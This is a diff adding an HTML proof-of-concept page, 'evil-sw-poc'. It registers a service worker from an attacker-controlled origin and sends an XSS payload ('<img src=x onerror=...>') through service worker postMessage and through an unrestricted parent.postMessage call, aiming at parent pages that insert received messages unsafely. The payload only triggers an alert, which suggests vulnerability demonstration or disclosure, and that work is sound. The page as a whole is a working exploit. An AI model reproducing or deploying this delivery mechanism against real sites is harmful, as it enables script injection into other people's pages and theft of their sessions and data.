@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>evil-sw-poc</title></head>
+<body>
+  <h1>evil sw poc</h1>
+  <script>
+    // register the service worker from same origin (attacker.com)
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/sw.js').then(reg => {
+        // ensure controller
+        navigator.serviceWorker.ready.then(() => {
+          // Ask SW to broadcast the payload (fallback)
+          if (navigator.serviceWorker.controller) {
+            try {
+              navigator.serviceWorker.controller.postMessage({cmd:'boom', payload:'<img src=x onerror=alert("POC via SW postMessage")>'});
+            } catch(e) {}
+          }
+        });
+      }).catch(e => console.error('sw reg fail', e));
+    }
+
+    // Also try plain postMessage from iframe to parent (some parents accept)
+    setTimeout(()=> {
+      try {
+        parent.postMessage('<img src=x onerror=alert("POC: direct postMessage")>','*');
+      } catch(e) {}
+    }, 500);
+  </script>
+</body>
+</html>
